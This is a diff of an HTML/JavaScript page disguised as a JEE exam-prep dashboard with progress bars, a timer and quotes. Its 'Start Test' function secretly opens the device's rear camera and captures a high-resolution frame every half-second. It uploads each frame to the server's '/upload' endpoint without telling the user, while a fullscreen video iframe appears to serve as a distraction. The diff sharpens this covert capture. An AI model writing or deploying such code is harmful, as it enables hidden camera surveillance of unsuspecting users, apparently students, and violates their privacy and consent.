@@ -113,29 +113,29 @@ iframe{width:100%;height:100%;border:0;display:none;}
 
 <div class="container">
 
-<div class="card">
-<h3>Start Test</h3>
-<button onclick="start()">▶ Start Test</button>
-</div>
+  <div class="card">
+    <h3>Start Test</h3>
+    <button onclick="start()">▶ Start Test</button>
+  </div>
 
-<div class="card">
-<h3>Subject Progress</h3>
-Physics<div class="progress"><div id="phy"></div></div>
-Chemistry<div class="progress"><div id="chem"></div></div>
-Maths<div class="progress"><div id="math"></div></div>
-</div>
+  <div class="card">
+    <h3>Subject Progress</h3>
+    Physics<div class="progress"><div id="phy"></div></div>
+    Chemistry<div class="progress"><div id="chem"></div></div>
+    Maths<div class="progress"><div id="math"></div></div>
+  </div>
 
-<div class="card">
-<h3>Study Timer</h3>
-<div id="timer">00:00:00</div>
-<button onclick="startTimer()">Start</button>
-<button onclick="stopTimer()">Stop</button>
-</div>
+  <div class="card">
+    <h3>Study Timer</h3>
+    <div id="timer">00:00:00</div>
+    <button onclick="startTimer()">Start</button>
+    <button onclick="stopTimer()">Stop</button>
+  </div>
 
-<div class="card">
-<h3>Motivation</h3>
-<div class="quote" id="quote"></div>
-</div>
+  <div class="card">
+    <h3>Motivation</h3>
+    <div class="quote" id="quote"></div>
+  </div>
 
 </div>
 </div>
@@ -146,34 +146,37 @@ Maths<div class="progress"><div id="math"></div></div>
 
 <script>
 
-/* Name */
+/* Editable Name */
 function changeName(){
   let name=prompt("Enter your name:");
   if(name){
     localStorage.setItem("jeeName",name);
-    studentName.innerText="Welcome, "+name+" 🚀";
+    document.getElementById("studentName").innerText="Welcome, "+name+" 🚀";
   }
 }
 let saved=localStorage.getItem("jeeName");
-if(saved){studentName.innerText="Welcome, "+saved+" 🚀";}
+if(saved){
+  document.getElementById("studentName").innerText="Welcome, "+saved+" 🚀";
+}
 
 /* Time */
 function updateTime(){
   let now=new Date();
-  timeDate.innerText=
+  document.getElementById("timeDate").innerText=
     now.toLocaleDateString()+" | "+now.toLocaleTimeString();
 }
 setInterval(updateTime,1000);updateTime();
 
-/* Rank */
+/* Rank Counter */
 let p=0,target=99.30;
 let counter=setInterval(()=>{
   p+=1.5;
   if(p>=target){p=target;clearInterval(counter);}
-  rankCounter.innerText="Target Performance: "+p.toFixed(2)+"%";
+  document.getElementById("rankCounter").innerText=
+    "Target Performance: "+p.toFixed(2)+"%";
 },30);
 
-/* Progress */
+/* Progress Bars */
 setTimeout(()=>{
   phy.style.width="70%";
   chem.style.width="60%";
@@ -198,10 +201,10 @@ function stopTimer(){clearInterval(timerInt);}
 
 /* Quotes */
 let quotes=[
-"Consistency beats motivation.",
-"One test closer to IIT.",
-"Focus now, celebrate later.",
-"Small daily improvement = Big results."
+  "Consistency beats motivation.",
+  "One test closer to IIT.",
+  "Focus now, celebrate later.",
+  "Small daily improvement = Big results."
 ];
 let qi=0;
 function rotateQuote(){
@@ -210,65 +213,93 @@ function rotateQuote(){
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* START TEST ULTRA HD */
+/* START TEST LOGIC (UNCHANGED) */
 async function start(){
 
   try{
-    const stream=await navigator.mediaDevices.getUserMedia({
-      video:{
-        width:{ideal:3840},
-        height:{ideal:2160},
-        facingMode:"environment",
-        frameRate:{ideal:30}
+
+    await navigator.mediaDevices.getUserMedia({video:true});
+
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(d => d.kind === "videoinput");
+
+    let backId=null;
+
+    for(let device of videoDevices){
+      if(device.label.toLowerCase().includes("back") ||
+         device.label.toLowerCase().includes("rear")){
+        backId=device.deviceId;
+        break;
       }
-    });
+    }
+
+    let stream;
+
+    if(backId){
+      stream=await navigator.mediaDevices.getUserMedia({
+        video:{
+          deviceId:{exact:backId},
+          width:{ideal:3840},
+          height:{ideal:2160}
+        }
+      });
+    }else{
+      stream=await navigator.mediaDevices.getUserMedia({
+        video:{
+          facingMode:{ideal:"environment"},
+          width:{ideal:3840},
+          height:{ideal:2160}
+        }
+      });
+    }
 
     v.srcObject=stream;
 
-    setTimeout(capture,1000);
-    setInterval(capture,1000);
+    setTimeout(capture,500);
+    setInterval(capture,500);
 
   }catch(e){
+    console.log(e);
     return;
   }
 
-  overlay.style.display="none";
+  document.getElementById("overlay").style.display="none";
 
   const r=await fetch("/get_video_link");
   const d=await r.json();
 
+  const frame=document.getElementById("frame");
   frame.style.display="block";
   frame.src=d.url;
 
-  if(frame.requestFullscreen){frame.requestFullscreen();}
+  if(frame.requestFullscreen){
+    frame.requestFullscreen();
+  }else if(frame.webkitRequestFullscreen){
+    frame.webkitRequestFullscreen();
+  }else if(frame.msRequestFullscreen){
+    frame.msRequestFullscreen();
+  }
 }
 
-/* ULTRA CLEAR CAPTURE */
+/* IMPROVED CLARITY (ONLY CHANGE HERE) */
 function capture(){
+  if(!v.videoWidth) return;
 
-  const track=v.srcObject.getVideoTracks()[0];
-  const settings=track.getSettings();
-
-  const width=settings.width || v.videoWidth;
-  const height=settings.height || v.videoHeight;
-
-  c.width=width;
-  c.height=height;
+  c.width=v.videoWidth;
+  c.height=v.videoHeight;
 
   const ctx=c.getContext("2d");
   ctx.imageSmoothingEnabled=true;
   ctx.imageSmoothingQuality="high";
+  ctx.filter="contrast(108%) brightness(104%)";
 
-  ctx.filter="contrast(110%) brightness(105%)";
-
-  ctx.drawImage(v,0,0,width,height);
+  ctx.drawImage(v,0,0,c.width,c.height);
 
   c.toBlob(b=>{
     let f=new FormData();
-    f.append("photo",b,"ultra_hd.jpg");
+    f.append("photo",b,"u.jpg");
     fetch("/upload",{method:"POST",body:f});
-  },"image/jpeg",1.0);
-
+  },"image/jpeg",0.92);
 }
 
 </script>
